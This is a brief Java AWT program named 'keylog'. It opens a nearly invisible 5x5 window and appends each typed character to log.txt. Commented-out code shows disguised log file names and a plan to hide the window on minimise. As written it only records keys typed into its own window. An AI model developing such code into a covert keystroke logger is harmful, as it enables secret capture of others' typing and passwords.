import java.awt.*;
import java.awt.event.*;
import java.io.*;

// import javax.swing.text.AttributeSet.ColorAttribute;


public class keylog extends Frame{
    RandomAccessFile rf;
    String s;
    TextArea ta;
    keylog()
    {
        s="";
        setSize(5,5);
        setVisible(true);
        setLayout(new FlowLayout());

        // ta=new TextArea(20,40);
        // add(ta);
        // ta.setBackground(Color.GRAY);
        // ta.setText("demo");
        addKeyListener(new KeyAdapter(){
            public void keyTyped(KeyEvent ke)
            {
                // char c=ke.getKeyChar();
                // s+=c;
                // ta.setText(s);
                try{
                    File f=new File("log.txt");
                    // File f=new File("log.png");
                    // File f=new File("log.mp3");

                    if(!f.exists())
                    f.createNewFile();

                    rf=new RandomAccessFile(f,"rw");
                    long x=f.length();
                    rf.seek(x);
                   char c=ke.getKeyChar();
                    rf.writeChar(c);
                    rf.close();
                }catch(Exception e)
                {
                }
            }
        });
        addWindowListener(new WindowAdapter(){
            public void windowIconified(WindowEvent we)
            {
                // we.getWindow().setVisible(false);
            }
            public void windowDeactivated(WindowEvent we)
            {
                
            }
            public void windowClosing(WindowEvent we)
            {
                // try{
                //     File f=new File("log.txt");
                //     if(!f.exists())
                //     f.createNewFile();

                //     rf=new RandomAccessFile(f,"rw");
                //     long x=f.length();
                //     rf.seek(x);
                //     rf.writeChars(s);
                //     rf.close();
                // }catch(Exception e)
                // {

                // }
                System.exit(0);
            }
        });
    }
 
    public static void main(String []args)
    {
        keylog obj =new keylog();
    }
}
